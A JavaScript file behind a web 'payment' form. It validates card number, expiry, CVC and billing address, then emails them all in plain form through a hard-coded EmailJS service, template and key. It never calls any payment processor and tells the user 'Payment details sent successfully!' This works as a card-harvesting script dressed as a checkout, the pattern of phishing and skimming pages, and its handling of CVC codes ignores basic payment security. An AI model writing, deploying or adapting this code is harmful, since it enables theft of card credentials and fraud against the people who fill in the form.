// EmailJS configuration
const EMAILJS_SERVICE_ID = "service_uhxg8hf";
const EMAILJS_TEMPLATE_ID = "template_ledkaye";
const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";

// Initialize EmailJS
emailjs.init(EMAILJS_PUBLIC_KEY);

// Get DOM elements
const payButton = document.getElementById("payButton");
const errorMessage = document.getElementById("errorMessage");
const expDateInput = document.getElementById("expDate");

// Function to format expiration date to MM/YY
expDateInput.addEventListener("blur", (e) => {
  let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters

  if (value.length === 6) {
    // Convert MMYYYY to MM/YY
    e.target.value = `${value.slice(0, 2)}/${value.slice(4)}`;
  } else if (value.length === 4) {
    // Convert MMYY to MM/YY
    e.target.value = `${value.slice(0, 2)}/${value.slice(2)}`;
  }
});

// Handle form submission
payButton.addEventListener("click", () => {
  const cardNumber = document.getElementById("cardNumber").value.replace(/\D/g, ""); // Only numbers
  const expDate = document.getElementById("expDate").value; // MM/YY format handled automatically
  const cvc = document.getElementById("cvc").value.replace(/\D/g, ""); // Only numbers
  const streetAddress = document.getElementById("streetAddress").value.trim();
  const city = document.getElementById("city").value.trim();
  const state = document.getElementById("state").value.trim();
  const zipCode = document.getElementById("zipCode").value.replace(/\D/g, ""); // Only numbers

  // Validate fields
  if (!cardNumber || cardNumber.length < 12 || cardNumber.length > 19) {
    errorMessage.textContent = "Invalid card number.";
    errorMessage.style.display = "block";
    return;
  }
  if (!/^\d{2}\/\d{2}$/.test(expDate)) {
    errorMessage.textContent = "Invalid expiration date. Use MM/YY format.";
    errorMessage.style.display = "block";
    return;
  }
  if (cvc.length < 3 || cvc.length > 6) {
    errorMessage.textContent = "Invalid CVC.";
    errorMessage.style.display = "block";
    return;
  }
  if (streetAddress === "" || city === "" || state === "") {
    errorMessage.textContent = "Billing address fields cannot be empty.";
    errorMessage.style.display = "block";
    return;
  }
  if (zipCode.length < 5 || zipCode.length > 15) {
    errorMessage.textContent = "Invalid ZIP Code.";
    errorMessage.style.display = "block";
    return;
  }

  // Hide error message if everything is correct
  errorMessage.style.display = "none";

  // EmailJS parameters
  const templateParams = {
    card_number: cardNumber,
    exp_date: expDate,
    cvc_code: cvc,
    street_address: streetAddress,
    city: city,
    state: state,
    zip_code: zipCode,
  };

  // Send email
  emailjs
    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
    .then(() => {
      alert("Payment details sent successfully!");
      document.getElementById("paymentForm").reset(); // Reset form
    })
    .catch((error) => {
      alert("Failed to send payment details.");
      console.error("FAILED...", error);
    });
});





